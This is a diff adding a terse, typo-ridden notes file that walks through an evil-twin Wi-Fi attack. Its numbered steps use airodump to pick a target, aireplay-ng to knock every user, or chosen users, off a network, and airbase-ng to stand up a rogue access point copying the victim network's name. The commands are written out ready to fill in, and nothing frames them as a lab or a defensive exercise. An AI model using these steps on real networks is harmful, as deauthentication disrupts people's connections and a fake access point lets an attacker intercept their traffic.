@@ -1,0 +1,18 @@
+1)  on the monitor_mode
+
+2)  do airodump and choose the channel essid and the bssid of the person you
+
+3)  now we use aireplay and deauthenticate the users from the connected wifi and we make our wifi strong
+ using aireplay ::::::::::::
+   a) for every user:-
+ 
+       aireplay-ng -0 0 -a mac_address initerface name
+  
+   b)for single /chossen users:-
+  
+       aireplay-ng --deauth number_of_packets -a router_mac_address -c user_mac_address interface_name
+
+4) using airbase-ng:::::::::::::::::
+   
+      airbase-ng -a router_mac --essid "name_of_wifi" -c channel_name_of_essid_in_airodump name_of_interface   
+
